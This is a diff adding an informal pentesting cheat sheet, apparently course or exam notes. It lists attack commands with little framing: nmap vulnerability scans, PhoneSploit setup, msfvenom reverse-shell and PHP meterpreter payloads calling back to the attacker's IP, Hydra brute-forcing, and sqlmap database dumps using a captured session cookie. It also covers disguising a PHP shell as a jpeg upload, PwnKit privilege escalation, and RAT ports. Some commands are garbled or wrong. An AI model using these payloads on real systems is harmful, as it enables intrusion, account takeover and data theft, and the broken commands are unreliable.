@@ -1,0 +1,140 @@
+NMAP
+nmap -A ip
+nmap -P port -sV -iL ip
+nmap -A -sV -Pn  ip address
+nmap -P 80 8443 443 8080 
+nmap -P 445 ip
+nmap -sS -T4 --script vuln ip address
+nmap -sS -sV -p- -O ip
+
+
+
+phonesploit
+apt install adb
+git clone phonespoit.com
+pip3 install colorama
+
+
+python3 phonesploit.py 
+ip address
+4 
+
+
+
+
+
+
+
+remote execution
+Telnet ip port
+.RUN 
+Msfvenom -l payloads | grep netcat
+Msfconsole 
+Msfvenom -p cmd/unix/reverse_tcp lhost lport
+Copy payload
+Attach Run nc- | nup 444 
+Victim
+.Run paste payload
+
+sudo tcpdump ip proto \\icmp -i tun0
+
+
+
+Enumeration
+
+enum4linux -a ip
+
+
+
+
+
+using hydra
+hydra -l usr/share/seclists/Passwords/Leaked-Databases/rockyou-35.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar 192.179.31.102 ftp
+
+
+
+
+
+
+
+
+
+
+encryption tools 
+cryptoforge
+BC text encoder
+
+Hash tools
+hashcalc
+MD5calculator
+hashmyfile
+
+cryptool
+DIE tools 
+
+
+
+
+
+
+privilage escalation
+Linpeas CURL 
+cd /tmp
+Pwnkit run
+make
+./
+
+
+
+malware analysyst
+DIE 
+PE tool
+
+
+
+
+SQL injection syntax
+'1'OR 1=1#
+
+bursuite proxy intercept on
+sqlmap -r burp.txt --dbs
+
+$ sqlmap -u "URL" --cookie="captured cookie of looged in user" --dbs    #for Database
+$ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME* --tables #for Tables of selected Database
+$ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME* -T *TABLE NAME* --colmns #for Column names
+$ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME* -T *TABLE NAME* --dump #dump t
+
+
+gobuster dir --url http://ip/ -w /usr/share/wordlist/seclist/Discovery/Web-Content/Direc.2.3.txt 
+
+
+
+sqlmap -r <txt file from burpsuite> -D <database name> --tables
+sqlmap -r <txt file from burpsuite> -D <database name> --tables --columns
+sqlmap -r <txt file from burpsuite> -D <database name> --dump
+sqlmap -r <txt file from burpsuite> -D <database name> --tables -T users
+
+
+
+LHOST=ourip
+RHOST=targetip
+msfvenom ‐p php/meterpreter/reverse_tcp LHOST=attackerip LPORT=4444 ‐f raw >exploit.php
+use exploit/multi/handler set payload 
+php/meterpreter/reverse_tcp
+msfconsole
+search handler
+user 30
+set lhost = self ip
+setLPORT = 4444
+run
+burp change application to jpeg
+
+
+MQTT
+
+
+aircrack-ng /.cap -w /wordlist
+
+
+9871 and 6703 ports theef RAT
+njrat 5552
